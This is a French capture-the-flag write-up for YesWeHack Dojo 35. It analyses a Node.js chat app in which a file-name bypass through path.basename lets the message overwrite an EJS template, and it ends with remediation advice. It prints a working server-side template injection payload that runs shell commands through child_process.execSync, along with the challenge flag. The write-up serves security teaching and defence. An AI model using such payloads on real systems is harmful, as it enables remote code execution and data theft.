+++
author = "Chic0s"
title = "Dojo 35 - YesWeHack"
date = "2024-09-05"
description = "SSTI - Chatroom"
tags = [
    "SSTI",
]
categories = ["dojo"]
+++
-----------

##### Description

Une **SSTI (Server-Side Template Injection)** est une vulnérabilité qui survient lorsqu'une application web permet à un attaquant d'injecter du code malveillant directement dans le modèle (template) utilisé côté serveur pour générer du contenu dynamique. Les moteurs de templates, tels que EJS, Jinja2, Pug, et bien d'autres, sont souvent utilisés pour séparer la logique d'application de la présentation des données. Cependant, si ces moteurs de templates ne traitent pas correctement les données fournies par l'utilisateur, cela peut offrir aux attaquants une opportunité d'injecter du code qui sera interprété et exécuté par le serveur

#### Exploitation

##### Analyse du code

Dans un premier temps, nous avons accès à une messagerie en ligne. Cette application a pour but d'envoyer des messages à des utilisateurs. La première étape va être de passer le code en revue de cette application sous **NodeJS**.

Les 17 premières lignes sont dédiées à la class **Message**. Le constructeur dispose de trois propriétés : this.**to**, this.**msg**, this.**file**.

De plus, nous avons trois méthodes :

*   `send()` : afficher un message : 'Message sent to:' et de la variable this.**to**.
*   `makeDraft()` : écrire un fichier ayant pour nom la **date.now()** et la variable this.**to**. (exemple : `1726488868468_Brumens`) La donnée  contenu dans le fichier est la variable this.**msg**.
*   `getDraft()` : retourner un fichier qui a pour nom la variable : this.**file**

L'objectif de cette classe est d'envoyer un message à un receveur et de sauvegarder le message sous forme de fichier.
```js
    class Message {
        constructor(to, msg) {
            this.to = to;
            this.msg = msg;
            this.file = null
        }
        send() {
            console.log(`Message sent to: ${this.to}`)
        }
        makeDraft() {
            this.file = path.basename(`${Date.now()}_${this.to}`)
            fs.writeFileSync(this.file, this.msg)
        }
        getDraft() {
            return fs.readFileSync(this.file)
        }
    }
```
Les prochaines lignes correspondent au traitement de l'input de l'utilisateur. L'input est décoder par la fonction **decodeURIComponent()** puis enregistré dans la constante **userData**. De plus, une variable **data** est un objet littéral (Un objet créé avec des accolades) contenant deux propriétés :

*   **to** est le destinataire d'un message ;
*   **msg** qui est le contenu du message.

Dans un second temps, une condition vérifie que la constante **userData** soit différente de ""(vide). Si la condition est à **true**, on rentre dans le bloc `try` qui va parser la constante **userData** :
```js
    const userData = decodeURIComponent("%7B%0A%20%20%22to%22%3A%20%22Brumens%22%2C%0A%20%20%22msg%22%3A%20%22Hello%20!%22%0A%7D")
    console.log(JSON.parse(userData))

    { to: 'Brumens', msg: 'Hello !' }
```
Enfin, si une erreur est détectée dans le bloc `try` alors un message d'erreur est affiché.
```js
    const userData = decodeURIComponent("eee")

    var data = {"to":"", "msg":""}
    if ( userData != "" ) {
        try {
            data = JSON.parse(userData)
        } catch(err) {
            console.error("Error : Message could not be sent!")
        }
    }
```
Pour finir, on crée une nouvelle instance de la classe `Message` en passant deux arguments :

*   data\["to"\] : Le destinataire du message, récupéré de l'objet **data**.
*   data\["msg"\] : Le contenu du message, également extrait de **data**.

On génère un fichier basé sur l'horodatage et le destinataire et écrit le contenu du message dans ce fichier.

La dernière ligne effectue plusieurs opérations importantes :

*   Lecture du fichier `index.ejs` au format **UTF-8**.
*   L'utilisation de la fonction `ejs.render()` pour injecter dynamiquement la valeur **message.msg** pour être utilisée dans les balises EJS du fichier `index.ejs`.
```js
    var message = new Message(data["to"], data["msg"])
    message.makeDraft()

    console.log( ejs.render(fs.readFileSync('index.ejs', 'utf8'), {message: message.msg}) )
```

##### Exploitation du code

Pour exploiter l'application de messagerie, nous devons afficher le fichier **flag.txt** qui se situe dans le dossier **/tmp/**.

Tout d'abord, il faut exploiter la fonction `makeDraft()` pour écrire un fichier afin de lire le flag. Le premier contournement à mettre en place est de contrôler le nom du fichier pour réécrire le fichier `index.ejs`. De plus, nous pourrons écrire notre charge utile dans le champ `msg` qui sera le contenu du fichier.

Pourquoi exploiter la fonction makeDraft() ?

La fonction utilise `path.basename()` qui récupère la dernière partie d'un chemin de fichier. Exemple :
```js
    this.to = "/index.ejs"
    path.basename(`${Date.now()}_${this.to}`)
```
    Résultat : 'index.ejs'

Dans notre cas, nous allons pouvoir réécrire **index.ejs**.

Pourquoi contrôler le template index.ejs ?

Si nous sommes en mesure de contrôler le template, nous pouvons injecter une charge utile. Dans notre cas, nous cherchons à afficher le fichier **flag.txt**.

Pour identifier une SSTI, nous pouvons utiliser un **payload** de type `7*7`. Le site devrait renvoyer `49`.
Si nous analysons le code qui _setup_ le challenge, on constate l'utilisation de balise :

![image](/images/1105afe7-fd29-4aff-b840-bcd4e728b61f-Xbaimage.png)

Les balises permettent d'insérer dynamiquement une variable ou d'évaluer l'expression et affiche le résultat dans le rendu HTML.

![image](/images/82eef834-25ed-4bee-8236-36825ce9ed5a-Detect.png)

Ci-dessus la payload utilisée pour vérifier la _SSTI._ Nous pouvons constater que le résultat est de 49.

POC

Le flag sera affiché via la charge utile encodée suivante :

    {
      "to": "/index.ejs",
      "msg": "<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString(); %>"
    }

![image](/images/75e6afd1-446a-41b3-b2b3-c8ffd56bdabf-gwwimage.png)

Le flag est **FLAG{W1th\_Cr34t1vity\_C0m3s\_RCE!!}**

#### Les risques

Les vulnérabilités SSTI présentent des risques de sécurité importants pour les systèmes. En exploitant ces failles, les attaquants peuvent injecter du code malveillant directement dans le moteur de template côté serveur, leur permettant ainsi d'exécuter des commandes arbitraires, d'accéder à des fichiers sensibles sur le serveur, ou de compromettre des informations confidentielles.

Cela peut entraîner des violations de la confidentialité, des atteintes à l'intégrité des données, voire un contrôle total du serveur par un acteur malveillant. Les applications vulnérables sont souvent celles qui génèrent dynamiquement des pages web à partir de moteurs de template non sécurisés, sans validation appropriée des entrées utilisateurs. Ces systèmes exposent alors des risques majeurs d'exploitation par des attaquants cherchant à contourner les mécanismes de sécurité traditionnels.

#### Remédiation

Pour se protéger contre les vulnérabilités _SSTI_, nous recommandons de suivre ces mesures :

1.  **Valider et échapper les entrées utilisateur** : Évitez d'inclure directement les entrées utilisateur dans les templates. Utilisez des fonctions d'échappement spécifiques aux moteurs de templates pour empêcher l'exécution de code malveillant.

2.  **Limiter les fonctionnalités des moteurs de templates** : Désactivez les fonctionnalités non essentielles des moteurs de templates, comme l'exécution de code ou l'accès direct aux fichiers système, si elles ne sont pas nécessaires.

3.  **Utiliser des moteurs de templates sécurisés** : Choisissez des moteurs de templates réputés pour leur sécurité, avec des options de configuration qui permettent de prévenir les injections de code.

4.  **Appliquer le principe du moindre privilège** : Limitez les privilèges des comptes de service utilisés par l'application pour minimiser les dommages potentiels en cas d'exploitation.

5.  **Filtrer les entrées utilisateur** : Appliquez une validation stricte sur toutes les données fournies par les utilisateurs avant de les insérer dans un template. Cela peut inclure la vérification de types, formats, et contenus attendus.

6.  **Mettre à jour les bibliothèques et frameworks** : Assurez-vous que tous les moteurs de templates et bibliothèques utilisés sont à jour avec les derniers correctifs de sécurité.

7.  **Sensibilisation et formation** : Formez les développeurs et les équipes de sécurité aux meilleures pratiques pour sécuriser les templates et éviter les vulnérabilités SSTI.

En mettant en œuvre ces mesures, vous réduirez considérablement les risques associés aux vulnérabilités SSTI dans vos applications et systèmes.

#### Les références

**OWASP** - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/18-Testing\_for\_Server\_Side\_Template\_Injection

**Path | NodeJS** - https://nodejs.org/api/path.html
